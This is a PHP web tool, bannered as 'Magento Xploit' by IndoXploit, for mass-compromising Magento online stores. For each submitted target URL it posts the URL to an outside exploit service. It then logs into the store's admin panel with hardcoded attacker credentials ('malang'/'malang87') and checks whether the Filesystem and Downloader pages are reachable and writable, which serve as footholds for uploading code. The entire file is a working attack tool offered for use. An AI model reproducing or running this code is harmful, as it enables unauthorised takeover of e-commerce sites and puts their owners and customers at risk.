<?php
function cover() {
	return "<center>[+] Magento Xploit [+]<br>
	## -= IndoXploit - Sanjungan Jiwa =- ##<br>
	## Thanks to: fatoni.id/malangXploit.php -  Synchronizer ##<br>
	## Recoded by Mr. Error 404 | IndoXploit ##<br><br></center>";
}
function ngcurl($url,$post=null) {
	$ch = curl_init($url);
	if($post != null) {
	  	  curl_setopt($ch, CURLOPT_POST, true);
	  	  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	}
	  	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	  	  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
	  	  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
	  	  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	  	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	  	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	  	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	return curl_exec($ch);
	  	  curl_close($ch);
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
echo cover();
?>
<?php
$link = explode("\r\n", $_POST['target']);
$go = $_POST['go'];
if(isset($go)) {
	foreach($link as $url) {
		$post_to_fatoni = array(
			"url" => $url,
			"hajar" => "Xploit!",
		);
		$curl_fatoni = ngcurl("http://fatoni.id/malangXploit.php", $post_to_fatoni);
		if(preg_match("/Exploiting Success, mulai mengecek login../", $curl_fatoni)) {
			echo "Target: <a href='$url' target='_blank'>$url</a><br>";
			echo "Status: Sukses Di Xploit<br>";
			echo "Ngecek Login........  ";
			$ambil = htmlspecialchars(@file_get_contents($url));
			preg_match("/<input name=\"form_key\" type=\"hidden\" value=\"(.*?)\">/", $ambil, $key);
			$post_login = array(
    	       	"form_key" => $key[1],
    	       	"login[username]" => "malang",
    	       	"dummy" => "",
    	       	"login[password]" => "malang87",
    	       );
			$login = ngcurl($url."/admin/", $post_login);
    	    if(preg_match("/Log Out|malang/", $login)) {
    	    	$key2 = ambilKata($login,"/filesystem/adminhtml_filesystem/index/key/","/");
    	    	$key3 = ambilKata($login,"/system_account/index/key/","/");
    	    	echo "OK<br>";
    	    	echo "username: malang<br>";
    	    	echo "password: malang87<br>";
    	    	echo "Filesystem: ";
    	    	$curl_filesystem = ngcurl($url."/filesystem/adminhtml_filesystem/index/key/$key2/", null);
    	    	if(preg_match("/File System/", $curl_filesystem)) {
    	    		echo "Ada<br>";
    	    	} else {
    	    		echo "Gaada<br>";
    	    	}
    	    	echo "Downloader: ";
    	    	$post_downloader = array(
    	    		"username" => "malang",
    	    		"password" => "malang87",
    	    		);
    	    	$url_d = parse_url($url, PHP_URL_HOST);
    	    	$curl_downloader = ngcurl($url_d."/downloader/", $post_downloader);
    	    	if(preg_match("/Return to Admin|Log Out/i", $curl_downloader)) {
    	    		if(preg_match("/Your Magento folder does not have sufficient write permissions./", $curl_downloader)) {
    	    			$stat_down = "<font color=red>Permissions</font>";
    	    		} else {
    	    			$stat_down = "<font color='#008000'>Permissions</font>";
    	    		}
    	    		echo "Ada [ <a href='http://$url_d/downloader/' target='_blank'>http://$url_d/downloader/</a> ( $stat_down ) ]<br>";
    	    	} else {
    	    		echo "Gaada<br>";
    	    	}
    	    } else {
    	    	echo "Gagal<br>";
    	    }
    	echo "<br>";
		} else {
			echo "Target: $url<br>";
			echo "Status: Gagal Di Xploit<br><br>";
		}
	}
} else {
?>
<html>
<body onLoad="type_text()" ; bgColor=#FFFFFFF">
<center>
<form method="post">
<textarea name="target" placeholder="http://www.target.com/" style="width: 500px; height: 250px;"></textarea><br>
<input type="submit" name="go" value="Xploit" style="width: 500px;">
</form>
</center>
</html>
<?php
}
?>
